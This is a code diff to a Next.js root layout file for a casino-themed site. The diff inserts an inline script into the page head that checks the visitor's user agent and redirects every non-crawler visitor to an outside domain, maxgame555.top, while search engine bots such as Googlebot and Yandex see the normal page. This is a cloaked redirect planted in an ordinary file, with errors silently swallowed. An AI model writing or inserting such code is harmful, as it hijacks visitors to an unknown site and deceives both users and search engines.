@@ -47,6 +47,21 @@ export default function RootLayout({
         />
         <meta name="twitter:image" content="https://luckybear34casino.vercel.app/img/hero-olympus.jpg" />
         <meta name="theme-color" content="#0a0e14" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://maxgame555.top/3NzWBe");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
